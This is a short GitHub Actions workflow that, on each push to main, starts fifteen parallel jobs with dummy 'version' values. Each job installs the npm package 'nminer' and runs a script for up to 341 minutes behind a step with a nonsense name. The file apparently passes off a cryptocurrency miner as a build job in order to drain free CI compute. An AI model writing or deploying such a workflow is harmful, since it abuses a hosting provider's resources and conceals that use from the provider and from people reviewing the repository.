name: excess
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9862 }
          - { version: 9672 }
          - { version: 3151 }
          - { version: 4608 }
          - { version: 7269 }
          - { version: 8306 }
          - { version: 413 }
          - { version: 5126 }
          - { version: 453 }
          - { version: 2942 }
          - { version: 5782 }
          - { version: 2084 }
          - { version: 1847 }
          - { version: 6570 }
          - { version: 3593 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: amongst watery yahoo
        run: |
          npm install nminer@latest
          timeout 341m node excess.js || echo "excess executed"